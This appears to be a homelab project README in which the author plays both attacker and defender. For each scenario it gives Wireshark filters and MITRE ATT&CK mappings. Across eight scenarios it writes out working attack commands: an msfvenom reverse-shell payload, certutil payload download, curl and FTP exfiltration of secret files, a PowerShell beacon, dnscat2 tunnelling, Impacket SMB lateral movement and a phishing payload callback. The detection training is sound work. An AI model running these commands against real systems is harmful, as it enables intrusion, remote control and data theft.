# 🔍 Network Analysis Project

## 📌 Overview
This project demonstrates **end-to-end adversary simulation and network traffic analysis** in a controlled homelab environment. By generating malicious traffic myself, I analyzed it in Wireshark to showcase how a SOC analyst detects and responds to real-world threats. This hands-on approach highlights practical skills in red teaming, packet analysis, forensic investigation, and threat mapping.

I acted as both:
- **Red Team (Attacker):** Simulating MITRE ATT&CK techniques such as command-and-control (C2), data exfiltration, and lateral movement.
- **Blue Team (Defender):** Analyzing traffic in Wireshark and developing detection rules mapped to MITRE ATT&CK.

---

## 🖥️ Lab Setup
- **Attacker:** Kali Linux (`192.168.2.131`)
- **Victim:** Windows 10 FLARE VM (`192.168.2.129`)
- **Sniffer:** Wireshark (running on Windows for packet analysis). I applied custom filters with Basic, Basic+, and Basic+DNS profiles to reduce noise and highlight relevant traffic (HTTP requests, TLS handshakes, DNS queries) while filtering out unnecessary broadcast traffic.
- **Network:** VirtualBox Host-Only Network (isolated for safety).
- **Tools Used:** msfvenom, netcat (nc), certutil, ftp, custom scripts for beaconing; Wireshark for analysis; Sysmon for endpoint correlation (where applicable).

---

## 🎯 Objectives
- Generate **realistic malicious traffic** across the attack lifecycle (initial access, execution, persistence, exfiltration).
- Perform **deep packet inspection** with Wireshark filters and stream reconstruction.
- Map detections to the **MITRE ATT&CK framework** for threat intelligence alignment.
- Identify IOCs and recommend defenses to enhance SOC workflows.

---

## ⚔️ Red Team vs Blue Team Scenarios

### ✅ Scenario 1 — Reverse Shell (C2 over TCP)
- **Red Team Action:**  
  Generated a reverse shell payload with `msfvenom`:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.131 LPORT=4444 -f exe -o payload.exe
  ```
  Hosted the payload on Kali and delivered it via certutil on the victim:
  ```cmd
  certutil -urlcache -split -f http://192.168.2.131:8080/payload.exe payload.exe
  ```
  Executed the payload to establish a reverse shell back to the attacker (using `nc -lvnp 4444` on Kali).

- **Blue Team Detection (Wireshark):**  
  Filter: `(http.request or tls.handshake.type==1) and !(ssdp)`  
  Observed outbound connection from victim to attacker, followed by command execution.  
  **MITRE Mapping:** T1071 – Application Layer Protocol (C2); T1059 – Command and Scripting Interpreter.

---

### ✅ Scenario 2 — Data Exfiltration via HTTP
- **Red Team Action:**  
  Simulated exfiltration of sensitive data by uploading a file via HTTP POST from the victim:
  ```cmd
  curl -X POST -F "file=@secrets.txt" http://192.168.2.131:8080/exfil
  ```
  Attacker received the file on Kali using a Python HTTP server with POST handling.

- **Blue Team Detection (Wireshark):**  
  Filter: `(http.request or tls.handshake.type==1) and !(ssdp)`  
  Detected abnormal outbound HTTP POST traffic with file uploads; reconstructed the exfiltrated file from the stream.  
  **MITRE Mapping:** T1041 – Exfiltration Over C2 Channel; T1567 – Exfiltration Over Web Service.

---

### ✅ Scenario 3 — Beaconing Behavior (C2 Heartbeats)
- **Red Team Action:**  
  Deployed a custom beacon script on the victim that sent periodic HTTP requests to the attacker:
  ```powershell
  while ($true) { Invoke-WebRequest -Uri http://192.168.2.131:8080/beacon -Method GET; Start-Sleep -Seconds 10 }
  ```
  Attacker monitored for check-ins on Kali.

- **Blue Team Detection (Wireshark):**  
  Filter: `http.request.uri contains "beacon" and tcp.port == 8080`  
  Detected regular, timed outbound GET requests with no payload variation, indicating automated C2.  
  **MITRE Mapping:** T1071.001 – Application Layer Protocol: Web Protocols; T1571 – Non-Standard Port.

---

### ✅ Scenario 4 — File Transfer via FTP
- **Red Team Action:**  
  Used the built-in Windows FTP client to exfiltrate a file:
  ```cmd
  ftp 192.168.2.131
  user anonymous
  pass anonymous
  put confidential.docx
  bye
  ```
  Attacker ran an FTP server on Kali to receive the file.

- **Blue Team Detection (Wireshark):**  
  Filter: `ftp or ftp-data`  
  Captured clear-text FTP commands, credentials, and file transfers; reconstructed the uploaded file.  
  **MITRE Mapping:** T1048 – Exfiltration Over Alternative Protocol; T1020 – Automated Exfiltration.

---

### ✅ Scenario 5 — DNS Tunneling for C2
- **Red Team Action:**  
  Used dnscat2 on the victim to establish a C2 channel via DNS queries:
  ```bash
  dnscat2 --dns domain=attacker.domain --port 53
  ```
  Attacker ran the dnscat2 server on Kali to receive tunneled commands.

- **Blue Team Detection (Wireshark):**  
  Filter: `dns.qry.type == TXT or dns.qry.type == AAAA`  
  Observed unusually long or frequent DNS queries with encoded payloads, indicating tunneling.  
  **MITRE Mapping:** T1071.004 – Application Layer Protocol: DNS; T1572 – Protocol Tunneling.

---

### ✅ Scenario 6 — SMB Lateral Movement
- **Red Team Action:**  
  From the victim, used Impacket's smbclient to move laterally to another host and execute a command:
  ```bash
  smbclient.py DOMAIN/user:password@192.168.2.130 -c "dir"
  ```
  Simulated file copy or remote execution.

- **Blue Team Detection (Wireshark):**  
  Filter: `smb2 or smb`  
  Detected SMB sessions with file listings or writes; noted unusual authentication attempts.  
  **MITRE Mapping:** T1021.002 – Remote Services: SMB/Windows Admin Shares; T1570 – Lateral Tool Transfer.

---

### ✅ Scenario 7 — Ransomware Simulation (File Encryption Traffic)
- **Red Team Action:**  
  Deployed a simulated ransomware payload that encrypted files and exfiltrated a ransom note via HTTPS:
  ```powershell
  Get-ChildItem -Path C:\Data -Recurse | ForEach-Object { $_.FullName + ".encrypted" } # Simulated encryption
  Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up!"
  ```
  Attacker received the note on Kali.

- **Blue Team Detection (Wireshark):**  
  Filter: `http contains "encrypted" or tls.handshake.extensions_server_name == "attacker.domain"`  
  Identified rapid file access patterns followed by exfiltration; reconstructed encrypted file metadata.  
  **MITRE Mapping:** T1486 – Data Encrypted for Impact; T1041 – Exfiltration Over C2 Channel.

---

### ✅ Scenario 8 — Phishing Link Resolution and Callback
- **Red Team Action:**  
  Simulated a phishing email click by resolving a malicious domain and calling back for a payload:
  ```cmd
  nslookup malicious.attacker.domain
  curl http://malicious.attacker.domain/payload.js
  ```
  Attacker hosted the domain on Kali with a DNS server.

- **Blue Team Detection (Wireshark):**  
  Filter: `dns or http.request.uri contains "malicious"`  
  Captured DNS resolution followed by HTTP callback; flagged unknown domains.  
  **Sysmon Integration:** Event ID 22 - DNS Query for suspicious resolutions.  
  **MITRE Mapping:** T1566 – Phishing; T1598 – Phishing for Information.

---

## 📊 Threat Observations
- **Reverse Shells:** Persistent outbound connections to non-standard ports with interactive data.
- **Data Exfiltration:** Anomalous data volumes in HTTP, FTP, or SMB traffic.
- **Beaconing:** Timed, repetitive patterns without user interaction.
- **DNS Tunneling:** Oversized or high-volume DNS queries.
- **SMB Lateral Movement:** Admin share access and file transfers.
- **Ransomware Traffic:** Rapid file operations followed by exfiltration.
- **Phishing Callbacks:** Suspicious DNS resolutions to unknown domains.

---

## 🗺️ MITRE ATT&CK Mapping
| Scenario                 | Technique ID           | Name                                               |
|--------------------------|-----------------------|--------------------------------------------------|
| Reverse Shell            | T1071, T1059          | Application Layer Protocol (C2); Command and Scripting Interpreter |
| Data Exfiltration        | T1041, T1567          | Exfiltration Over C2 Channel; Exfiltration Over Web Service |
| Beaconing                | T1071.001, T1571      | Application Layer Protocol: Web Protocols; Non-Standard Port |
| FTP Exfiltration         | T1048, T1020          | Exfiltration Over Alternative Protocol; Automated Exfiltration |
| DNS Tunneling            | T1071.004, T1572      | Application Layer Protocol: DNS; Protocol Tunneling |
| SMB Lateral Movement      | T1021.002, T1570      | Remote Services: SMB/Windows Admin Shares; Lateral Tool Transfer |
| Ransomware Simulation     | T1486, T1041          | Data Encrypted for Impact; Exfiltration Over C2 Channel |
| Phishing Link Resolution  | T1566, T1598          | Phishing; Phishing for Information              |
